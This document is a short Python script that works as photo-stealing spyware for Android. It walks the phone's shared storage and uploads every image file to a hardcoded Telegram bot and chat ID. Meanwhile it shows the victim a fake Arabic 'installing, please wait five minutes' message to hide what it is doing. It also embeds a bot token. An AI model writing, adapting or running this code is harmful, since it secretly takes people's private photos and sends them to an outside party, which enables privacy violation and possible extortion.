import os
import telebot
from threading import Thread
logo=("""\033[1;91m
\033[1;32m _ \033[1;31m  _  \033[1;32m _   \033[1;31m_  \033[1;32m _\n\033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \  \n \033[1;32mN | A | D | E | R \n\033[1;31m\_/ \033[1;32m\_/\033[1;31m \_/ \033[1;32m\_/ \033[1;31m\_/
\033[1;32m--------------------------------------------------""")
print(logo)
bot = telebot.TeleBot("6238470351:AAHjGIk20n34TUrDBVkdgdC0faL07MZkYac") 


dir_path = "/storage/emulated/0/"
 

def send_file(file_path):
 with open(file_path, "rb") as f:
  if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
   bot.send_photo(chat_id="1350971290",photo=f) 
  else:
   print('يتم تثبيت الان الرجاء الانتضار 5دقائق')
   


for root, dirs, files in os.walk(dir_path):
 threads = []
 for file in files:
  file_path = os.path.join(root, file)
  t = Thread(target=send_file, args=(file_path,))
  t.start()
  threads.append(t)
 for thread in threads:
  thread.join()
